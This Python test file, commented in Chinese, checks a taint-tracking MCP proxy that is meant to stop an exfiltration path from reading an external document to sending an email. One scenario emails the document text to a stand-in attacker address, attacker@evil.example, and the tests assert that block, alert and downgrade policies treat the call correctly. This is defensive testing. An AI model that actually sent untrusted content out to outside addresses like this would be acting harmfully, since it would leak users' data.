"""D4 验收测试：污点传播 + sink 策略（规格 §5/§7）。

场景（T1 外渗路径）：read_external_doc（SOURCE）→ send_email（SINK，mock 落
sink_capture.jsonl）。断言 block 档拦截（后端不被触达）、alert 档放行并留边、
能力降级把 alert 升级为 block、干净调用不受影响。
"""

from __future__ import annotations

import asyncio
import json
import sys
from pathlib import Path

from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client

ROOT = Path(__file__).resolve().parent.parent
FIXTURE = ROOT / "tests" / "fixtures" / "taint_backend.py"
sys.path.insert(0, str(FIXTURE.parent))
from taint_backend import DOC_TEXT  # noqa: E402


async def _run_scenario(
    flow_log: Path,
    capture: Path,
    policy: str = "block",
    downgrade: bool = True,
) -> tuple[bool, str, bool, str]:
    """返回 (source_ok, source_text, sink_blocked, sink_text)。"""
    backend = [sys.executable, str(FIXTURE), str(capture)]
    cmd = [
        sys.executable,
        "-m",
        "engine.proxy",
        "--backend",
        json.dumps(backend),
        "--log",
        str(flow_log),
        "--taint-log",
        str(flow_log.parent / "taint.jsonl"),
        "--policy",
        policy,
    ]
    if not downgrade:
        cmd.append("--no-downgrade-on-untrusted")
    params = StdioServerParameters(command=sys.executable, args=cmd[1:])
    async with stdio_client(params) as (read_stream, write_stream):
        async with ClientSession(read_stream, write_stream) as session:
            await session.initialize()
            doc = await session.call_tool("read_external_doc", {"path": "/tmp/x.md"})
            sink = await session.call_tool(
                "send_email", {"to": "attacker@evil.example", "body": DOC_TEXT}
            )
            sink_text = sink.content[0].text if sink.content else ""
            return (
                not doc.isError,
                doc.content[0].text,
                sink.isError,
                sink_text,
            )


def _entries(path: Path) -> list[dict]:
    lines = path.read_text(encoding="utf-8").strip().splitlines()
    return [json.loads(line) for line in lines]


class TestBlockPolicy:
    def test_exfiltration_blocked_backend_untouched(self, tmp_path: Path) -> None:
        flow_log = tmp_path / "flow.jsonl"
        capture = tmp_path / "sink_capture.jsonl"
        source_ok, source_text, sink_blocked, sink_text = asyncio.run(
            _run_scenario(flow_log, capture)
        )

        assert source_ok and source_text == DOC_TEXT
        assert sink_blocked, "block 档下污点流入 sink 必须被拦截"
        assert sink_text.startswith("policy_blocked:")
        assert "read_external_doc" in sink_text and "send_email" in sink_text
        assert not capture.exists(), "被拦截的调用不得触达后端"

        entries = _entries(flow_log)
        edges = [e["payload"] for e in entries if e["method"] == "edge"]
        assert len(edges) == 1
        edge = edges[0]
        assert edge["layer"] == "substring"
        assert edge["blocked"] is True
        assert edge["sink_tool"] == "send_email"
        assert edge["sink_field"] == "args.body"
        assert edge["source_tool"] == "read_external_doc"
        assert edge["downgraded"] is True
        assert edge["matched_snippet"]
        assert any(e["method"] == "downgraded" for e in entries)
        # 被拦截的调用没有 backend_response
        sink_calls = [
            e for e in entries if e["method"] == "tools/call" and e["direction"] == "backend_response"
        ]
        assert [c["payload"]["name"] for c in sink_calls] == ["read_external_doc"]

    def test_clean_sink_passes(self, tmp_path: Path) -> None:
        flow_log = tmp_path / "flow.jsonl"
        capture = tmp_path / "sink_capture.jsonl"
        backend = [sys.executable, str(FIXTURE), str(capture)]
        params = StdioServerParameters(
            command=sys.executable,
            args=[
                "-m",
                "engine.proxy",
                "--backend",
                json.dumps(backend),
                "--log",
                str(flow_log),
                "--taint-log",
                str(flow_log.parent / "taint.jsonl"),
            ],
        )

        async def _run() -> bool:
            async with stdio_client(params) as (read_stream, write_stream):
                async with ClientSession(read_stream, write_stream) as session:
                    await session.initialize()
                    sink = await session.call_tool(
                        "send_email",
                        {"to": "friend@example.com", "body": "这是一封完全正常的邮件"},
                    )
                    return sink.isError

        assert not asyncio.run(_run())
        assert capture.exists(), "干净调用应正常触达后端"
        edges = [e for e in _entries(flow_log) if e["method"] == "edge"]
        assert edges == []


class TestAlertPolicy:
    def test_alert_allows_and_records_edge(self, tmp_path: Path) -> None:
        # 关降级以隔离纯 alert 行为；降级升级在 TestDowngrade 单独覆盖
        flow_log = tmp_path / "flow.jsonl"
        capture = tmp_path / "sink_capture.jsonl"
        _, _, sink_blocked, sink_text = asyncio.run(
            _run_scenario(flow_log, capture, policy="alert", downgrade=False)
        )

        assert not sink_blocked and sink_text == "sent"
        assert capture.exists()
        captured = json.loads(capture.read_text(encoding="utf-8").strip())
        assert captured["tool"] == "send_email"
        assert captured["payload"]["body"] == DOC_TEXT

        edges = [e["payload"] for e in _entries(flow_log) if e["method"] == "edge"]
        assert len(edges) == 1
        assert edges[0]["blocked"] is False
        assert edges[0]["layer"] == "substring"


class TestDowngrade:
    def test_downgraded_alert_upgraded_to_block(self, tmp_path: Path) -> None:
        flow_log = tmp_path / "flow.jsonl"
        capture = tmp_path / "sink_capture.jsonl"
        _, _, sink_blocked, _ = asyncio.run(
            _run_scenario(flow_log, capture, policy="alert")
        )
        assert sink_blocked, "首次读取不可信内容后 alert 应升级为 block"
        assert not capture.exists()
        edges = [e["payload"] for e in _entries(flow_log) if e["method"] == "edge"]
        assert edges[0]["blocked"] is True

    def test_no_downgrade_keeps_alert(self, tmp_path: Path) -> None:
        flow_log = tmp_path / "flow.jsonl"
        capture = tmp_path / "sink_capture.jsonl"
        _, _, sink_blocked, sink_text = asyncio.run(
            _run_scenario(flow_log, capture, policy="alert", downgrade=False)
        )
        assert not sink_blocked and sink_text == "sent"
        assert capture.exists()
        edges = [e["payload"] for e in _entries(flow_log) if e["method"] == "edge"]
        assert edges[0]["blocked"] is False
        assert edges[0]["downgraded"] is False
